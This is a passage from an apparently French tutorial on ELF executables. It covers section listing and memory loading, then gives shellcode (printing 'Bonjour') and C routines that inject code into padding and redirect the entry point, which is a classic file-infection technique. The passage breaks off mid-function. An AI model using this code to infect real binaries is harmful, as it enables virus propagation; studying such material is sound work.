+&nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/fread.html"><span style="color: #000066;">fread</span></a><span style="color: black;">&#40;</span><span style="color: #339933;">&amp;</span>hdr<span style="color: #339933;">,</span> <span style="color: #993333;">sizeof</span><span style="color: black;">&#40;</span><span style="color: #993333;">char</span><span style="color: black;">&#41;</span><span style="color: #339933;">,</span> <span style="color: #993333;">sizeof</span><span style="color: black;">&#40;</span>Elf32_Ehdr<span style="color: black;">&#41;</span><span style="color: #339933;">,</span> fp<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">&#40;</span>hdr.<span style="color: #202020;">e_shoff</span> <span style="color: #339933;">==</span> <span style="color: #0000dd;">0</span><span style="color: black;">&#41;</span> <span style="color: black;">&#123;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/fprintf.html"><span style="color: #000066;">fprintf</span></a><span style="color: black;">&#40;</span>stderr<span style="color: #339933;">,</span> <span style="color: #ff0000;">&quot;Absence de sections<span style="color: #000099; font-weight: bold;">\n</span>&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">return</span> <span style="color: #0000dd;">0</span><span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#125;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #808080; font-style: italic;">/* Positionner sur la table des sections */</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/fseek.html"><span style="color: #000066;">fseek</span></a><span style="color: black;">&#40;</span>fp<span style="color: #339933;">,</span> hdr.<span style="color: #202020;">e_shoff</span><span style="color: #339933;">,</span> SEEK_SET<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/printf.html"><span style="color: #000066;">printf</span></a><span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot; # Position Taille wax<span style="color: #000099; font-weight: bold;">\n</span>&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; Elf32_Shdr sec<span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; Elf32_Half i<span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">for</span> <span style="color: black;">&#40;</span>i <span style="color: #339933;">=</span> <span style="color: #0000dd;">0</span><span style="color: #339933;">;</span> i <span style="color: #339933;">&lt;</span> hdr.<span style="color: #202020;">e_shnum</span><span style="color: #339933;">;</span> <span style="color: #339933;">++</span>i<span style="color: black;">&#41;</span> <span style="color: black;">&#123;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #808080; font-style: italic;">/* Lire l'élément i */</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/fread.html"><span style="color: #000066;">fread</span></a><span style="color: black;">&#40;</span><span style="color: #339933;">&amp;</span>sec<span style="color: #339933;">,</span> <span style="color: #993333;">sizeof</span><span style="color: black;">&#40;</span><span style="color: #993333;">char</span><span style="color: black;">&#41;</span><span style="color: #339933;">,</span> <span style="color: #993333;">sizeof</span><span style="color: black;">&#40;</span>Elf32_Shdr<span style="color: black;">&#41;</span><span style="color: #339933;">,</span> fp<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/printf.html"><span style="color: #000066;">printf</span></a><span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;%2i &quot;</span><span style="color: #339933;">,</span> i<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/printf.html"><span style="color: #000066;">printf</span></a><span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;%8x &quot;</span><span style="color: #339933;">,</span> sec.<span style="color: #202020;">sh_offset</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/printf.html"><span style="color: #000066;">printf</span></a><span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;%8x &quot;</span><span style="color: #339933;">,</span> sec.<span style="color: #202020;">sh_size</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/printf.html"><span style="color: #000066;">printf</span></a><span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;%c%c%c<span style="color: #000099; font-weight: bold;">\n</span>&quot;</span><span style="color: #339933;">,</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; sec.<span style="color: #202020;">sh_flags</span> <span style="color: #339933;">%</span> <span style="color: #0000dd;">2</span> <span style="color: #339933;">?</span> <span style="color: #ff0000;">'w'</span> <span style="color: #339933;">:</span> <span style="color: #ff0000;">' '</span><span style="color: #339933;">,</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #808080; font-style: italic;">/* Inscriptoble */</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#40;</span>sec.<span style="color: #202020;">sh_flags</span> <span style="color: #339933;">&gt;&gt;</span> <span style="color: #0000dd;">1</span><span style="color: black;">&#41;</span> <span style="color: #339933;">%</span> <span style="color: #0000dd;">2</span> <span style="color: #339933;">?</span> <span style="color: #ff0000;">'a'</span> <span style="color: #339933;">:</span> <span style="color: #ff0000;">' '</span><span style="color: #339933;">,</span>&nbsp; &nbsp; <span style="color: #808080; font-style: italic;">/* Alloué */</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#40;</span>sec.<span style="color: #202020;">sh_flags</span> <span style="color: #339933;">&gt;&gt;</span> <span style="color: #0000dd;">2</span><span style="color: black;">&#41;</span> <span style="color: #339933;">%</span> <span style="color: #0000dd;">2</span> <span style="color: #339933;">?</span> <span style="color: #ff0000;">'x'</span> <span style="color: #339933;">:</span> <span style="color: #ff0000;">' '</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span> &nbsp; <span style="color: #808080; font-style: italic;">/* Exécutable */</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#125;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/fclose.html"><span style="color: #000066;">fclose</span></a><span style="color: black;">&#40;</span>fp<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">return</span> <span style="color: #0000dd;">0</span><span style="color: #339933;">;</span><br/>
+<span style="color: black;">&#125;</span><br/>
+&nbsp;</div>
+<p>Ce programme produit la sortie suivante</p>
+<pre class="source">
+$ ./section bash
+ # Position Taille wax
+ 0 0        0
+ 1 134      13      a
+...
+12 14210    79424   ax
+13 8d634    1c      ax
+14 8d660    14c98   a
+15 a22f8    2c      a
+16 a2324    9c      a
+...
+</pre>
+<h3><a name="c23"></a>Chargement en mémoire</h3>
+<p>Nous décrivons maintenant le mécanisme de chargement en mémoire. Cette partie est spécifique aux architectures de type ia86 Unix V Release 4.</p>
+<p>Pour des raisons d'efficacité les segments sont chargés en mémoire sans respecter le champ <em>p_align</em>, mais de façon à ce que la position du segment dans le fichier et son adresse en mémoire soient congruentes modulo la taille d'une page mémoire. En d'autre termes, on a la propriété <em>p_offset = p_vaddr [p_align]</em>. Sur le type de système considéré <em>p_align</em> vaut généralement 4ko (0x1000 octets).</p>
+<p>On notera que les droits alloués aux pages correspondent à la valeur de champ <em>p_flags</em>. Pour réaliser cette affectation, chaque segment est chargé sur une nouvelle page mémoire et non à la première adresse libre.</p>
+<p>Les deux mécanismes précédents engendrent des <em>blancs</em> ea mémoire avant et après les segments. Pour comprendre cela, prenons un exemple. On considère deux segments, le premier de 0x1200 octets et le second de 0x1000 octets. Le premier segment sera chargé entre l'adresse 0x0 et l'adresse 0x1200. La page mémoire suivante commence à l'adresse 0x2000. Selon les mécanismes précédents, le second segment sera chargé à partir de l'adresse 0x2200. Il y a donc un blanc de 0x800 octets après le premier segment et un blanc de 0x200 octets avant le second segment.</p>
+<p>Les espaces inutiles sont remplis avec les données précédant et suivant le segment chargé. Le Schéma 1 illustre ce phénomène.</p>
+<div align="center">
+<img src="img/vmk00/fig1.gif" alt="Schema 1: Chargement en mémoire"/>
+<p><strong>Schema 1: Chargement en mémoire</strong></p>
+</div>
+<h3><a name="c24"></a>Insertion de code</h3>
+<p>Cette partie expose une technique permettant d'insérer un fragment de code à l'intérieur dun fichier ELF exécutable.</p>
+<p>L'insertion de code a pour but d'introduire un fragment de code étranger dans un fichier hôte de manière à forcer l'interprétation du fragment inséré lors de l'exécution de l'hôte. L'insertion est soumise à plusieurs contraintes.</p>
+<ul>
+<li>Le fragment doit être inséré à l'intèrieur d'un segment qui sera chargé en mémoire.</li>
+<li>Le segment choisi devra être exécutable.</li>
+<li>L'insertion ne devra pas compromettre l'hôte.</li>
+</ul>
+<p>Pour satisfaire les deux premières contraintes, il sutfit de faire porter l'insertion sur un segment de type PT_LOAD et ayant un droit d'exécution. La troisième contrainte est plus problématique. Certaines instructions d'un programme peuvent faire référence à des données de manière absolue, c'est-à-dire en spécifiant leur adresse mémoire. Ainsi, l'insertion devra préserver les adresses des différentes données. Pour ce faire nous pouvons utiliser les blancs engendrés par le mécanisme de chargement. En effet, la modification de cette partie inutilisée de la mémoire n'affectera pas le reste du programme. Nous procéderons de la manière suivante où <em>fp</em> sera le fichier subissant l'insertion.</p>
+<ol>
+<li>La taille du code inséré devra être inférieure à la taille d'une page mémoire, soit 4ko. Ici nous choisissons un code imprimant "Bonjour" sur la sortie standard.
+<src lang='c">
+/* Shellcode à insérer */
+#define	SHC_RETADD	1
+#define	SHC_SIZE	49
+char code[] = 
+"\x68@@@@"		/* push @@@@ */
+			/* @@@@ est l'adresse de retour */
+			/* après l'exécution du shellcode */
+"\x50"			/* push eax */
+"\x51"			/* push ecx */
+"\x52"			/* push edx */
+"\x53"			/* push ebx */
+"\x31\xc0"		/* xor	eax eax */
+"\x31\xc9"		/* xor	ecx ecx */
+"\x31\xd2"		/* xor	edx edx */
+"\x31\xdb"		/* xor	ebx ebx */
+"\xb0\x04"		/* mov	al 0x4 */
+"\xb3\x01"		/* mov	bl 0x1 */
+"\xeb\x0a"		/* jmp	+0xa */
+"\x59"			/* pop	eax */
+"\xb2\x08"		/* mov	dl 0x8 */
+"\xcd\x80"		/* int	0x80 */
+"\x5b"			/* pop	ebx */
+"\x5a"			/* pop	edx */
+"\x59"			/* pop	ecx */
+"\x58"			/* pop	eax */
+"\xe8\xf1\xff\xff\xff"	/* call -0xf */
+"Bonjour\n\x0";
+</src></li>
+	<li>Rechercher un segment correspondant aux critères: il sera de type <em>PT_LOAD</em>, exécutable et suivi d'un blanc d'une taille supérieure à la taille d'une page mémoire.
+<div class="c" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: #808080; font-style: italic;">/* Rechercher un segment pour l'insertion */</span><br />
+Elf32_Phdr find_seg<span style="color: black;">&#40;</span>FILE<span style="color: #339933;">*</span> fp<span style="color: #339933;">,</span> Elf32_Ehdr hdr<span style="color: black;">&#41;</span> <span style="color: black;">&#123;</span><br />
+&nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/fseek.html"><span style="color: #000066;">fseek</span></a><span style="color: black;">&#40;</span>fp<span style="color: #339933;">,</span> hdr.<span style="color: #202020;">e_phoff</span><span style="color: #339933;">,</span> SEEK_SET<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br />
+&nbsp; &nbsp; &nbsp; &nbsp; Elf32_Phdr ins_seg<span style="color: #339933;">,</span> seg<span style="color: #339933;">;</span><br />
+&nbsp; &nbsp; &nbsp; &nbsp; Elf32_Half i<span style="color: #339933;">;</span><br />
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">for</span> <span style="color: black;">&#40;</span>i <span style="color: #339933;">=</span> <span style="color: #0000dd;">0</span><span style="color: #339933;">;</span> i <span style="color: #339933;">&lt;</span> hdr.<span style="color: #202020;">e_phnum</span><span style="color: #339933;">;</span> <span style="color: #339933;">++</span>i<span style="color: black;">&#41;</span> <span style="color: black;">&#123;</span><br />
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/fread.html"><span style="color: #000066;">fread</span></a><span style="color: black;">&#40;</span><span style="color: #339933;">&amp;</span>ins_seg<span style="color: #339933;">,</span> <span style="color: #993333;">sizeof</span><span style="color: black;">&#40;</span><span style="color: #993333;">char</span><span style="color: black;">&#41;</span><span style="color: #339933;">,</span> <span style="color: #993333;">sizeof</span><span style="color: black;">&#40;</span>Elf32_Phdr<span style="color: black;">&#41;</span><span style="color: #339933;">,</span> fp<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br />
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">&#40;</span>ins_seg.<span style="color: #202020;">p_type</span> <span style="color: #339933;">!=</span> PT_LOAD <span style="color: #339933;">||</span> ins_seg.<span style="color: #202020;">p_flags</span> <span style="color: #339933;">%</span> <span style="color: #0000dd;">2</span> <span style="color: #339933;">==</span> <span style="color: #0000dd;">0</span><span style="color: black;">&#41;</span><br />
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">continue</span><span style="color: #339933;">;</span><br />
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/fread.html"><span style="color: #000066;">fread</span></a><span style="color: black;">&#40;</span><span style="color: #339933;">&amp;</span>seg<span style="color: #339933;">,</span> <span style="color: #993333;">sizeof</span><span style="color: black;">&#40;</span><span style="color: #993333;">char</span><span style="color: black;">&#41;</span><span style="color: #339933;">,</span> <span style="color: #993333;">sizeof</span><span style="color: black;">&#40;</span>Elf32_Phdr<span style="color: black;">&#41;</span><span style="color: #339933;">,</span> fp<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br />
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">&#40;</span>seg.<span style="color: #202020;">p_vaddr</span> <span style="color: #339933;">-</span> <span style="color: black;">&#40;</span>ins_seg.<span style="color: #202020;">p_vaddr</span> <span style="color: #339933;">+</span> ins_seg.<span style="color: #202020;">p_filesz</span><span style="color: black;">&#41;</span> <span style="color: #339933;">&lt;</span> ins_seg.<span style="color: #202020;">p_align</span><span style="color: black;">&#41;</span><br />
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">continue</span><span style="color: #339933;">;</span><br />
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">return</span> ins_seg<span style="color: #339933;">;</span><br />
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#125;</span><br />
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #808080; font-style: italic;">/* Aucun segment trouvé */</span><br />
+&nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/fprintf.html"><span style="color: #000066;">fprintf</span></a><span style="color: black;">&#40;</span>stderr<span style="color: #339933;">,</span> <span style="color: #ff0000;">&quot;Aucun segment n'est valide<span style="color: #000099; font-weight: bold;">\n</span>&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br />
+&nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/exit.html"><span style="color: #000066;">exit</span></a><span style="color: black;">&#40;</span><span style="color: #0000dd;">1</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br />
+<span style="color: black;">&#125;</span><br />
+&nbsp;</div></li>
+	<li>Mettre à jour l'en-tête, ce qui comprend: la redirection du point d'entrée vers le code inséré et la mise à jour des positions des tables si elles se situent après le point d'insertion.
+<div class="c" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: #808080; font-style: italic;">/* Mise à jour de l'en-tête */</span><br />
+<span style="color: #993333;">int</span> update_header <span style="color: black;">&#40;</span>FILE<span style="color: #339933;">*</span> fp<span style="color: #339933;">,</span> Elf32_Ehdr hdr<span style="color: #339933;">,</span> Elf32_Addr new_entry<span style="color: #339933;">,</span> Elf32_Off shc_off<span style="color: #339933;">,</span> Elf32_Off align<span style="color: black;">&#41;</span> <span style="color: black;">&#123;</span><br />
+&nbsp; &nbsp; &nbsp; &nbsp; hdr.<span style="color: #202020;">e_entry</span> <span style="color: #339933;">=</span> new_entry<span style="color: #339933;">;</span><br />
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">&#40;</span>hdr.<span style="color: #202020;">e_phoff</span> <span style="color: #339933;">&gt;=</span> shc_off<span style="color: black;">&#41;</span><br />
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; hdr.<span style="color: #202020;">e_phoff</span> <span style="color: #339933;">+=</span> align<span style="color: #339933;">;</span><br />
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">&#40;</span>hdr.<span style="color: #202020;">e_shoff</span> <span style="color: #339933;">&gt;=</span> shc_off<span style="color: black;">&#41;</span><br />
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; hdr.<span style="color: #202020;">e_shoff</span> <span style="color: #339933;">+=</span> align<span style="color: #339933;">;</span><br />
+&nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/fseek.html"><span style="color: #000066;">fseek</span></a><span style="color: black;">&#40;</span>fp<span style="color: #339933;">,</span> <span style="color: #0000dd;">0</span><span style="color: #339933;">,</span> SEEK_SET<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br />
+&nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/fwrite.html"><span style="color: #000066;">fwrite</span></a><span style="color: black;">&#40;</span><span style="color: #339933;">&amp;</span>hdr<span style="color: #339933;">,</span> <span style="color: #993333;">sizeof</span><span style="color: black;">&#40;</span><span style="color: #993333;">char</span><span style="color: black;">&#41;</span><span style="color: #339933;">,</span> <span style="color: #993333;">sizeof</span><span style="color: black;">&#40;</span>Elf32_Ehdr<span style="color: black;">&#41;</span><span style="color: #339933;">,</span> fp<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br />
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">return</span> <span style="color: #0000dd;">0</span><span style="color: #339933;">;</span><br />
+<span style="color: black;">&#125;</span><br />
+&nbsp;</div></li>
+	<li>Mettre à jour les positions et les tailles des segments et des sections. Ceux localisés après l'insertion sont décalés de <em>ins_seg.p_align</em> octets. De plus, les tailles du segment et de la section ayant subi l'insertion sont augmentées de <em>ins_seg.p_align</em>.
+<div class="c" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: #808080; font-style: italic;">/* Mettre à jour de la table des segments */</span><br />
+<span style="color: #993333;">int</span> update_seg<span style="color: black;">&#40;</span>FILE<span style="color: #339933;">*</span> fp<span style="color: #339933;">,</span> &nbsp;Elf32_Ehdr hdr<span style="color: #339933;">,</span> Elf32_Off shc_off<span style="color: #339933;">,</span> Elf32_Off align<span style="color: black;">&#41;</span> <span style="color: black;">&#123;</span><br />
+&nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/fseek.html"><span style="color: #000066;">fseek</span></a><span style="color: black;">&#40;</span>fp<span style="color: #339933;">,</span> hdr.<span style="color: #202020;">e_phoff</span><span style="color: #339933;">,</span> SEEK_SET<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br />
+&nbsp; &nbsp; &nbsp; &nbsp; Elf32_Phdr seg<span style="color: #339933;">;</span><br />
+&nbsp; &nbsp; &nbsp; &nbsp; Elf32_Half i<span style="color: #339933;">;</span><br />
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">for</span> <span style="color: black;">&#40;</span>i <span style="color: #339933;">=</span> <span style="color: #0000dd;">0</span><span style="color: #339933;">;</span> i <span style="color: #339933;">&lt;</span> hdr.<span style="color: #202020;">e_phnum</span><span style="color: #339933;">;</span> <span style="color: #339933;">++</span>i<span style="color: black;">&#41;</span> <span style="color: black;">&#123;</span><br />
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/fread.html"><span style="color: #000066;">fread</span></a><span style="color: black;">&#40;</span><span style="color: #339933;">&amp;</span>seg<span style="color: #339933;">,</span> <span style="color: #993333;">sizeof</span><span style="color: black;">&#40;</span><span style="color: #993333;">char</span><span style="color: black;">&#41;</span><span style="color: #339933;">,</span> <span style="color: #993333;">sizeof</span><span style="color: black;">&#40;</span>Elf32_Phdr<span style="color: black;">&#41;</span><span style="color: #339933;">,</span> fp<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br />
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">&#40;</span>seg.<span style="color: #202020;">p_offset</span> <span style="color: #339933;">&gt;=</span> shc_off<span style="color: black;">&#41;</span><br />
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; seg.<span style="color: #202020;">p_offset</span> <span style="color: #339933;">+=</span> align<span style="color: #339933;">;</span><br />
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">else</span> <span style="color: #b1b100;">if</span> <span style="color: black;">&#40;</span>seg.<span style="color: #202020;">p_offset</span> <span style="color: #339933;">+</span> seg.<span style="color: #202020;">p_filesz</span> <span style="color: #339933;">==</span> shc_off<span style="color: black;">&#41;</span> <span style="color: black;">&#123;</span><br />
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; seg.<span style="color: #202020;">p_memsz</span> <span style="color: #339933;">+=</span> align<span style="color: #339933;">;</span><br />
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; seg.<span style="color: #202020;">p_filesz</span> <span style="color: #339933;">+=</span> align<span style="color: #339933;">;</span><br />
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#125;</span> <span style="color: #b1b100;">else</span><br />
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">continue</span><span style="color: #339933;">;</span><br />
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/fseek.html"><span style="color: #000066;">fseek</span></a><span style="color: black;">&#40;</span>fp<span style="color: #339933;">,</span> <span style="color: #339933;">-</span><span style="color: #993333;">sizeof</span><span style="color: black;">&#40;</span>Elf32_Phdr<span style="color: black;">&#41;</span><span style="color: #339933;">,</span> SEEK_CUR<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br />
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/fwrite.html"><span style="color: #000066;">fwrite</span></a><span style="color: black;">&#40;</span><span style="color: #339933;">&amp;</span>seg<span style="color: #339933;">,</span> <span style="color: #993333;">sizeof</span><span style="color: black;">&#40;</span><span style="color: #993333;">char</span><span style="color: black;">&#41;</span><span style="color: #339933;">,</span> <span style="color: #993333;">sizeof</span><span style="color: black;">&#40;</span>Elf32_Phdr<span style="color: black;">&#41;</span><span style="color: #339933;">,</span> fp<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br />
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#125;</span><br />
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">return</span> <span style="color: #0000dd;">0</span><span style="color: #339933;">;</span><br />
+<span style="color: black;">&#125;</span><br />
+<span style="color: #808080; font-style: italic;">/* Mettre à jour de la table des segments */</span><br />
+<span style="color: #993333;">int</span> update_sec<span style="color: black;">&#40;</span>FILE<span style="color: #339933;">*</span> fp<span style="color: #339933;">,</span> Elf32_Ehdr hdr<span style="color: #339933;">,</span> Elf32_Off shc_off<span style="color: #339933;">,</span> Elf32_off align<span style="color: black;">&#41;</span> <span style="color: black;">&#123;</span><br />
+&nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/fseek.html"><span style="color: #000066;">fseek</span></a><span style="color: black;">&#40;</span>fp<span style="color: #339933;">,</span> hdr.<span style="color: #202020;">e_shoff</span><span style="color: #339933;">,</span> SEEK_SET<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br />
+&nbsp; &nbsp; &nbsp; &nbsp; Elf32_Shdr sec<span style="color: #339933;">;</span><br />
+&nbsp; &nbsp; &nbsp; &nbsp; Elf32_Half i<span style="color: #339933;">;</span><br />
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">for</span> <span style="color: black;">&#40;</span>i <span style="color: #339933;">=</span> <span style="color: #0000dd;">0</span><span style="color: #339933;">;</span> i <span style="color: #339933;">&lt;</span> hdr.<span style="color: #202020;">e_shnum</span><span style="color: #339933;">;</span> <span style="color: #339933;">++</span>i<span style="color: black;">&#41;</span> <span style="color: black;">&#123;</span><br />
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/fread.html"><span style="color: #000066;">fread</span></a><span style="color: black;">&#40;</span><span style="color: #339933;">&amp;</span>sec<span style="color: #339933;">,</span> <span style="color: #993333;">sizeof</span><span style="color: black;">&#40;</span><span style="color: #993333;">char</span><span style="color: black;">&#41;</span><span style="color: #339933;">,</span> <span style="color: #993333;">sizeof</span><span style="color: black;">&#40;</span>Elf32_Shdr<span style="color: black;">&#41;</span><span style="color: #339933;">,</span> fp<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br />
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">&#40;</span>sec.<span style="color: #202020;">sh_offset</span> <span style="color: #339933;">&gt;=</span> shc_off<span style="color: black;">&#41;</span><br />
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; sec.<span style="color: #202020;">sh_offset</span> <span style="color: #339933;">+=</span> align<span style="color: #339933;">;</span><br />
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">else</span> <span style="color: #b1b100;">if</span> <span style="color: black;">&#40;</span>sec.<span style="color: #202020;">sh_offset</span> <span style="color: #339933;">+</span> sec.<span style="color: #202020;">sh_size</span> <span style="color: #339933;">==</span> shc_off<span style="color: black;">&#41;</span><br />
